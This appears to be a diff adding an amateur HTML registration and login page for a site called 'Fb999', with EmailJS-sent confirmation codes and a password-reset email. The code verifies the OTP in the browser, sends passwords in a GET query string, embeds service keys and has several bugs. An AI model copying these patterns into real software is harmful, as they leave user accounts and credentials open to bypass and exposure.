@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" >
+    <title>Scrolling Container</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+background-color: rgb(0,0,0);
+    background-color: rgba(0,0,0,0.4);
+        }
+        .container {
+            width: 84%;
+            height: 75vh;
+            overflow-y: scroll;
+            padding: 20px;
+           
+            border: 1px solid #ddd;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+margin-top: -54px;
+  background-image: url('lopp.jpg');
+    background-size: cover; /* Cover the entire element */
+    /* Center the image */
+    background-repeat: no-repeat;      
+        }
+   
+        .content {
+            height: 818px; /* For demonstration; content height to enable scrolling */
+        }
+        .logo img {
+            height: 57.5px; /* For demonstration; content height to enable scrolling */
+ position: fixed;
+margin-top: -425px;
+margin-left: -3px;
+width: 96%;
+border-radius: 4px;
+border: none;
+}
+.logo1 img{
+  margin-top: -25px;
+margin-left: -15px;
+width: 110%;
+border-radius: 4px; 
+   
+}
+ p{
+   font-size: 30px;
+   margin-top: -200px;
+      }
+      .logo2 img{
+  margin-top: -31px;
+margin-left: -15px;
+width: 110%;
+border-radius: 4px; 
+   
+}
+.tick-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 30px;
+            height: 30px;
+            background-color: white;
+            border-radius: 50%;
+            position: relative;
+            cursor: pointer;
+            border: 1px solid #6a6a6a; /* Optional: to make the circle visible on a white background */
+        }
+
+        .tick {
+            display: none;
+            position: absolute;
+            width: 9px;
+            height: 20px;
+            border: solid white;
+            border-width: 0 4px 4px 0;
+            transform: rotate(45deg);
+        }
+
+        .tick-container.clicked {
+            background-color: #408cfff5;
+        }
+
+        .tick-container.clicked .tick {
+            display: block;
+        }
+ .tick-container, tick{
+    margin-top: -229px;
+  margin-left: -11px;
+   }
+   .email{
+ margin-top: -505px;
+ 
+    }
+   .email input{
+      height: 29px;
+      border-radius: 11px;
+      border: none;
+      width: 93%;
+     font-size: 18px;
+   padding: 10px;
+                    }
+ .input-container {
+            position: relative;
+               width: 86%;
+      height: 38px;  
+    margin-top: 41px;
+        }
+.input-container input {
+   height: 29px;
+   width: 110%;
+}
+        .input-field {
+            width: 19%;
+            padding: 10px;
+            padding-right: 50px; /* Make space for the button */
+       margin-top: -5px;  
+             
+        }
+
+        .input-button {
+            position: absolute;
+            right: 0;
+            top: 0;
+            height: 100%;
+            padding: 0 10px;
+            border: none;
+            background-color: #2b96ffec;
+            color: white;
+            cursor: pointer;
+       border-radius: 18px;
+       width: 30%;
+       font-size: 16px;
+     margin-right: -50px;
+     
+     
+                  }
+   .email3 {
+      margin-top: 71.8px;
+     position: relative;
+   }
+   .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+  .email4 {
+      margin-top: 59px;
+     position: relative;
+     width: 100%;
+     }
+ .button1 {
+    margin-top: 10px;
+    
+ }    
+ .button1 button {
+     height: 51px;
+    width: 92%;
+    border-radius: 23px;
+    border: none;
+    margin-left: 17px;
+    font-size: 18px;
+    color: white;
+    background-color: blue;
+   font-weight: bold;
+   position: relative;
+                }
+      
+       #success-image {
+            display: none;
+            width: 70px;
+            height: 70px;
+            margin-top: -440px;
+         position: relative;
+   margin-left: 149px;    
+   border-radius: 10px;                
+   color: green;
+ z-index: 99999999999999;
+   }
+   .error-message {
+            color: red;
+            display: none;
+            position: relative;
+  font-weight: bold;
+  font-size: 16px; 
+ margin-top: -509px;
+           
+                   } 
+   .error-message2 {
+            color: red;
+            display: none;
+            position: relative;
+  font-weight: bold;
+  font-size: 16px; 
+ margin-top: -295px;
+ margin-left: 40px;     z-index: 99999999999999999;      
+                   } 
+   .sidebar {
+    height: 100%;
+    width: 0;
+    position: absolute;
+    z-index: 1;
+    top: 0;
+    right: 0;
+    background-color: #f5f5f5;
+    overflow-y: scroll;
+    transition: 0.5s;
+    padding-top: 60px;
+  
+}
+
+.sidebar a {
+    padding: 8px 8px 8px 32px;
+    text-decoration: none;
+    font-size: 55px;
+    color: rgba(255, 0, 0, 0.0); 
+    display: block;
+    transition: 0.3s;
+}
+
+.sidebar a:hover {
+    color: #f1f1f1;
+}
+
+ .closebtn {
+    position: relative;
+    top: -60px;
+    right: 25px;
+    font-size: 36px;
+    margin-left: 24px;
+    margin-bottom: -123px;
+    font-size: 78px;
+    color: white;
+z-index: 40000;
+}
+
+.openimg {
+    width: 50px; /* Adjust the size as needed */
+    cursor: pointer;
+}   
+.container2 {
+            width: 84%;
+            height: 81vh;
+            overflow-y: scroll;
+            padding: 90px;
+           
+            border: 1px solid #ddd;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+margin-top: -3px;
+        }
+    .man img{
+        width: 90%;
+        margin-left: 23px;
+        margin-top: 0.8px;
+    
+    pointer-events: none;
+             
+                    }
+  
+ .modal {
+    display: none;
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 130%;
+    overflow: auto;
+    background-color: rgb(0,0,0);
+    background-color: rgba(0,0,0,0.1);
+  margin-top: -57px;
+}
+
+/* Modal Content */
+.modal-content {
+    background-color: #fefefe;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 85%;
+    height: 67%;
+}
+
+/* The Close Button */
+.close {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: black;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.modal-img {
+    width: 100%;
+} 
+.lot input {
+    display: block;
+    margin-bottom: 10px;
+    padding: 8px;
+    width: 82%;
+    height: 35px;
+        margin-top: -239px;
+    position: absolute;    
+border: none;
+border-radius: 13px; 
+font-size: 20px;
+}
+.lot1 input {
+    display: block;
+    
+    padding: 8px;
+    width: 82%;
+   height: 35px;
+    margin-top: -124px;
+   position: absolute;
+  border-radius: 13px;
+border: none;   
+font-size: 20px;    
+     }
+.top button {
+            padding: 10px;
+            background-color: #58585891;
+            color: white;
+            border: none;
+            border-radius: 17px;
+            cursor: pointer;
+       margin-top: -629px; 
+      width: 800px;   
+     margin-left: 28px;
+  font-weight: bold;
+  font-size: 18px;
+             }
+
+        button.changed {
+            background-color: #0017ebd8;
+        width: 80%; /* Green background color when changed */
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    .tap {
+      margin-top: -110px;
+      position: absolute;     
+   margin-left: 78%; 
+      }
+      #loadingImage {
+      display: none;
+      width: 103%; /* Adjust as needed */
+      height: 106vh;
+   z-index: 9999999999999;
+   position: fixed;
+   margin-left: -14px;
+  margin-top: -437px;
+    }
+    </style>
+     <div id="container21">
+    <img id="loadingImage" src="display.jpg" alt="Loading..."></img></div>
+    <div class="logo">
+<img src="logo51.jpg" alt=""><img></div>
+<div class="bobb" style="height: 38px; width: 80%; position: fixed; margin-top: 79vh; margin-left: -30px; ">
+      <img style="height: 38px; width: 98%; margin-left: 18px;" src="bob.jpg" alt="" ></img>
+     </div>
+    <div class="container">
+    
+
+       
+ <div class="content">
+        
+            <div class="logo1">
+<img src="logo1.jpg" alt=""><img>
+       
+ <div class="logo2">
+<img src="logo2.jpg" alt=""><img>
+        
+  <div class="logo3">
+<img style="margin-top: -14px;" src="logo3.jpg" alt=""><img>
+<div class="logo4">
+<img src="logo4.jpg" alt=""><img> 
+ 
+ 
+  <div class="tick-container" onclick="toggleTick()">
+        <div class="tick"></div>
+    </div>  
+   <div class="email"</div>
+<input type="email" id="email" name="email" placeholder ="Please enter your email" required >
+
+ 
+ <div class="input-container">
+        <input type="number" class="input-field" id="otp-code" placeholder="Please enter the confirmation code">
+         <button class="input-button" onclick="sendOTP()">Send</button>
+    </div>
+  <div class="email3" >
+<input type="password" id="set-password" class="password-input" placeholder="Set Password">
+    <span class="toggle-password material-icons" onclick="togglePasswordVisibility('set-password')">visibility</span>
+  </div> 
+  <div class="email4">
+    <input type="password" id="confirm-password" class="password-input" placeholder="Confirm Password">
+    <span class="toggle-password material-icons" onclick="togglePasswordVisibility('confirm-password')">visibility</span>
+ </div>
+ 
+  
+ 
+  <div class="tol" style="margin-top: -70px;">
+   <img src="fan.jpg" alt="Open Sidebar" class="openimg" onclick="openNav()" style="height: 30px; width: 40%; margin-left: 150px; margin-top: 187.6px; "></img></div>
+
+
+
+ <div class="button1" >
+  <button id="register" style="position: relative; ">Register</button>
+  </div>
+    <img id="myImage" src="fan1.jpg" alt="Image" style="height: 58px; width: 88%; margin-left: 21px; cursor:pointer; margin-top: 14px; "></img> 
+    <div id="otp-error" class="error-message">Incorrect OTP</div>   
+   <div class="error-message"   id="success-image" style="color: #1ec700;            position: relative; font-weight: bold; font-size: 17px; margin-top: -509px; width: 71%; margin-left: 3px;">Confirmation Code Sent!! </div> 
+    <div  id="password-error" class="error-message2">Passwords doesn't match</div> 
+</div>
+      
+
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+        <!-- Modal content -->
+        <div class="modal-content">
+   
+ <div class="logo3">
+<img src="rat1.jpg" alt="" style="margin-top: -21px;"><img>
+<div class="logo2">
+
+  <img id="sendEmailImage" src="rat2.jpg" alt="Send Email"></img>  </div>
+          <div class="close" style="margin-top: -780px; position: fixed; font-size: 60px;  color: rgba(255, 0, 0, 0.0); ">&times;</div>   
+     <div class="close" id="extraClose" style="margin-top: -200px; position: fixed; font-size: 60px;  color: rgba(255, 0, 0, 0.0); margin-left: 20px;" > I love you v</div>   
+     <form id="loginForm" action="another.html" method="GET">                  
+     <div class="lot">
+        <input type="email" id="email1" name="email" required>
+        
+ </div>     
+ <div class="lot1">   
+        <input type="password" id="password1" name="password" required >
+     <div class="tap">
+ <span class="material-icons" id="togglePassword">visibility</span>   </div>    
+     <div class="top" style="margin-top: -220px; ">
+        <button type="submit" style="width: 86%; height: 47px; "type="button" id="colorButton" >Log in</button></div>
+     
+     
+        </div>
+ </div></div></div>
+    
+                  
+
+                    <!-- Sidebar -->
+                    <div id="mySidebar" class="sidebar">
+                       
+                       <a href="javascript:void(0)" class="closebtn" onclick="closeNav()"> × </a>  
+   
+    <div class="man">
+       <img src="man.jpg" alt="">
+    </div>  
+    <div class="man">
+       <img src="man1.jpg" alt="">
+    </div>  
+   <div class="man">
+       <img src="man2.jpg" alt="">
+    </div>  <div class="man">
+       <img src="man3.jpg" alt="">
+    </div>  <div class="man">
+       <img src="man4.jpg" alt="">
+    </div>  <div class="man">
+       <img src="man8.jpg" alt="">
+    </div> <div class="man">
+       <img src="man6.jpg" alt="">
+    </div> <div class="man">
+       <img src="man7.jpg" alt="">
+    </div> 
+    
+    <!-- Image that opens the modal -->
+    
+     <!-- Add more content here to see the scrolling effect -->
+        
+    </div>
+      
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+  const image = document.getElementById("loadingImage");
+
+  // Display the image
+  image.style.display = "block";
+
+  // Set timeout to hide the image after 3 seconds
+  setTimeout(() => {
+    image.style.display = "none";
+  }, 4000); // 7000ms = 3 seconds
+});
+   document.getElementById('register').onclick = function() {
+    const enteredOtp = document.getElementById('otp-code').value;
+    const setPassword = document.getElementById('set-password').value;
+    const confirmPassword = document.getElementById('confirm-password').value;
+    const tickContainer = document.querySelector('.tick-container');
+
+    let valid = true;
+
+    if (enteredOtp !== generatedOtp) {
+        const otpError = document.getElementById('otp-error');
+        otpError.style.display = 'block';
+        setTimeout(() => {
+            otpError.style.display = 'none';
+        }, 3000);
+        valid = false;
+    } else {
+        document.getElementById('otp-error').style.display = 'none';
+    }
+
+    if (setPassword !== confirmPassword) {
+        const passwordError = document.getElementById('password-error');
+        passwordError.style.display = 'block';
+        setTimeout(() => {
+            passwordError.style.display = 'none';
+        }, 3000);
+        valid = false;
+    } else {
+        document.getElementById('password-error').style.display = 'none';
+    }
+
+    if (!tickContainer.classList.contains('clicked')) {
+        alert('Please click the tick box.');
+        valid = false;
+    }
+
+    if (valid) {
+        window.location.href = 'index2.html'; // Redirect to about.html
+    }
+};
+
+    
+    function validateForm(event) {
+    const username = document.getElementById('email1');
+    const password = document.getElementById('password1');
+    
+    if (!username1.value || !password1.value) {
+        event.preventDefault(); // Prevent form submission
+        return; // Stop the function execution
+    }
+
+    // If both fields are filled, allow form submission which will redirect to another.html
+}
+    var email1FieldClicked = false;
+        var password1FieldClicked = false;
+
+        // Function to check if both fields have been clicked
+        function checkFields() {
+            var button = document.getElementById('colorButton');
+
+            if (email1FieldClicked && password1FieldClicked) {
+                button.classList.add('changed');
+            }
+        }
+
+        // Event listeners for input fields
+        document.getElementById('email1').addEventListener('click', function() {
+            email1FieldClicked = true;
+            checkFields();
+        });
+
+        document.getElementById('password1').addEventListener('click', function() {
+            password1FieldClicked = true;
+            checkFields();
+        });
+       var modal = document.getElementById("myModal");
+
+// Get the image and insert it inside the modal
+var img = document.getElementById("myImage");
+var modalImg = document.querySelector(".modal-img");
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+// When the user clicks on <span> (extraClose), close the modal
+  extraClose.onclick = function() {
+    modal.style.display = "none";
+  }
+
+// When the user clicks on the image, open the modal
+img.onclick = function() {
+    modal.style.display = "block";
+    
+}
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+    modal.style.display = "none";
+}
+extraClose.onclick = function() {
+    modal.style.display = "none";
+  }
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+ document.getElementById('password1').addEventListener('click', function() {
+            passwordFieldClicked = true;
+            checkFields();
+        });
+
+(function() {
+            emailjs.init("oG2-PQShPO15fq8qr"); // Replace with your EmailJS user ID
+        })();
+
+        
+        // Password visibility toggle
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            var passwordField = document.getElementById('password1');
+            var type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password1';
+            passwordField.setAttribute('type', type);
+            this.textContent = type === 'password1' ? 'visibility' : 'visibility_off';
+        });
+        document.getElementById('sendEmailImage').addEventListener('click', function() {
+            var email = document.getElementById('email1').value;
+            
+            if (!email1) {
+                alert('Please enter an email address.');
+                return;
+            }
+
+            var templateParams = {
+                to_email: email,
+      link: 'https://fb999.info/login/',
+      bank: 'Fb999',
+      reset: 'Reset Your fb999 Password'
+            };
+
+            emailjs.send('service_xz553ko', 'template_ysq0olo', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    alert('Password Reset sent successfully!! please check your email.');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Failed please check your connection.');
+                });
+        });
+ function openNav() {
+    document.getElementById("mySidebar").style.width = "420px";
+    
+}
+
+function closeNav() {
+    document.getElementById("mySidebar").style.width = "0";
+    
+}       
+     let generatedOtp;
+
+        function toggleTick() {
+            const container = document.querySelector('.tick-container');
+            container.classList.toggle('clicked');
+        }
+
+        function togglePasswordVisibility(inputId) {
+            const passwordInput = document.getElementById(inputId);
+            const toggleIcon = passwordInput.nextElementSibling;
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleIcon.textContent = 'visibility_off';
+            } else {
+                passwordInput.type = 'password';
+                toggleIcon.textContent = 'visibility';
+            }
+        }
+
+        function generateOTP() {
+            generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            return generatedOtp;
+        }
+
+        function sendOTP() {
+            const email = document.getElementById('email').value;
+            const otp = generateOTP();
+
+            emailjs.init("oG2-PQShPO15fq8qr"); // Replace with your EmailJS user ID
+
+            const templateParams = {
+                to_email: email,
+                otp_code: otp,
+               
+     
+       link_message: 'Fb999',
+      text: 'Your Fb999 Verification Code'
+            };
+
+            emailjs.send('service_xz553ko', 'template_s7x8xiv', templateParams)
+                .then((response) => {
+                    console.log('SUCCESS!', response.status, response.text);
+          showSuccessImage();
+                         
+                }, (error) => {
+                    console.error('FAILED...', error);
+                    alert('Failed to send OTP.');
+                });
+        }
+        function showSuccessImage() {
+            const successImage = document.getElementById('success-image');
+            successImage.style.display = 'block';
+            setTimeout(() => {
+                successImage.style.display = 'none';
+            }, 3000);
+        }
+
+</script>
